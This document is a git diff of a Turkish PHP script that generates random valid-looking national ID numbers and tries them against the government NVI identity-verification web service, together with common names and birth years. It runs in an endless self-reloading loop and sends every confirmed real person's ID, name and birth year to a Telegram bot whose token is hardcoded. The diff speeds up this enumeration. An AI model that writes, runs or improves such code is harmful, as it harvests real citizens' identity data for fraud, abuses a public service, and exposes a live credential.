@@ -1,7 +1,6 @@
 <?php
 header('Content-Type: text/html; charset=utf-8');
-// 502 hatasını önlemek için zaman aşımını kontrol altına alıyoruz
-set_time_limit(60); 
+set_time_limit(30); // Render'ın bağlantıyı kesmesini önler
 
 // --- AYARLAR ---
 $botToken = "8405664089:AAEJi8ipuYWCeKpRSFFYGINACt4Sej1xeNI"; 
@@ -15,29 +14,21 @@ function telegramGonder($msg, $token, $id) {
 function nviSorgu($tc, $ad, $soyad, $yil) {
     $xml = '<?xml version="1.0" encoding="utf-8"?>
     <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
-      <soap:Body>
-        <TCKimlikNoDogrula xmlns="http://tckimlik.nvi.gov.tr/WS">
-          <TCKimlikNo>'.$tc.'</TCKimlikNo>
-          <Ad>'.$ad.'</Ad>
-          <Soyad>'.$soyad.'</Soyad>
-          <DogumYili>'.$yil.'</DogumYili>
-        </TCKimlikNoDogrula>
-      </soap:Body>
-    </soap:Envelope>';
+      <soap:Body><TCKimlikNoDogrula xmlns="http://tckimlik.nvi.gov.tr/WS">
+      <TCKimlikNo>'.$tc.'</TCKimlikNo><Ad>'.$ad.'</Ad><Soyad>'.$soyad.'</Soyad><DogumYili>'.$yil.'</DogumYili>
+      </TCKimlikNoDogrula></soap:Body></soap:Envelope>';
 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, "https://tckimlik.nvi.gov.tr/Service/KPSPublic.asmx");
+    $ch = curl_init("https://tckimlik.nvi.gov.tr/Service/KPSPublic.asmx");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
     curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: text/xml; charset=utf-8']);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 502 hatasını önlemek için kısa timeout
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5); 
     $res = curl_exec($ch);
     curl_close($ch);
     return (strpos($res, '<TCKimlikNoDogrulaResult>true</TCKimlikNoDogrulaResult>') !== false);
 }
 
-// Algoritmaya uygun TC üretici
 function tcUret() {
     $n = [rand(1, 9)];
     for ($i = 1; $i < 9; $i++) $n[$i] = rand(0, 9);
@@ -50,31 +41,32 @@ function tcUret() {
 $isimler = ["MEHMET", "MUSTAFA", "AHMET", "ALİ", "HÜSEYİN", "HASAN", "AYŞE", "FATMA", "EMİNE"];
 $soyisimler = ["YILMAZ", "KAYA", "DEMİR", "ŞAHİN", "ÇELİK", "YILDIZ"];
 
-echo "Tarama başladı...<br>";
+echo "<h3>Toplu Tarama Aktif (Grup: 10)</h3>";
 
-for($i=1; $i<=20; $i++) {
-    // KANAL 1: TC Odaklı
-    $tc1 = tcUret();
-    $ad1 = $isimler[array_rand($isimler)];
-    $sy1 = $soyisimler[array_rand($soyisimler)];
-    $y1 = rand(1980, 2005);
+// 10'lu paketler halinde sorgu yapar
+for($i=1; $i<=10; $i++) {
+    $tc = tcUret();
+    $ad = $isimler[array_rand($isimler)];
+    $sy = $soyisimler[array_rand($soyisimler)];
+    $yil = rand(1978, 2005);
     
-    if(nviSorgu($tc1, $ad1, $sy1, $y1)) {
-        telegramGonder("✅ KANAL 1 BULDU:\nTC: $tc1\nAd: $ad1 $sy1\nYıl: $y1", $botToken, $chatId);
-    }
-
-    // KANAL 2: Ad-Soyad Odaklı Farklı Kombinasyon
-    $tc2 = tcUret();
-    $ad2 = $isimler[array_rand($isimler)];
-    $sy2 = $soyisimler[array_rand($soyisimler)];
-    $y2 = rand(1980, 2005);
+    echo "Sorgu $i: $tc ($ad $sy)... ";
     
-    if(nviSorgu($tc2, $ad2, $sy2, $y2)) {
-        telegramGonder("✅ KANAL 2 BULDU:\nTC: $tc2\nAd: $ad2 $sy2\nYıl: $y2", $botToken, $chatId);
+    if(nviSorgu($tc, $ad, $sy, $yil)) {
+        telegramGonder("✅ KİŞİ BULUNDU!\nTC: $tc\nAd: $ad $sy\nYıl: $yil", $botToken, $chatId);
+        echo "<b style='color:green;'>BULUNDU!</b><br>";
+    } else {
+        echo "<span style='color:gray;'>Başarısız</span><br>";
     }
-
-    echo "$i. tur denendi... ";
-    flush(); ob_flush();
-    usleep(500000); // Yarım saniye bekle
+    
+    // Tarayıcıya anlık bilgi gönderir
+    echo str_repeat(' ', 1024); 
+    flush(); 
+    ob_flush();
+    usleep(100000); // 0.1 saniye bekle
 }
+
+// Sayfayı 1 saniye sonra tazeleyerek sonsuz döngü sağlar
+echo "<script>setTimeout(function(){ location.reload(); }, 1000);</script>";
+echo "<p><i>Grup tamamlandı. Yeni grup 1 saniye içinde başlayacak...</i></p>";
 ?>
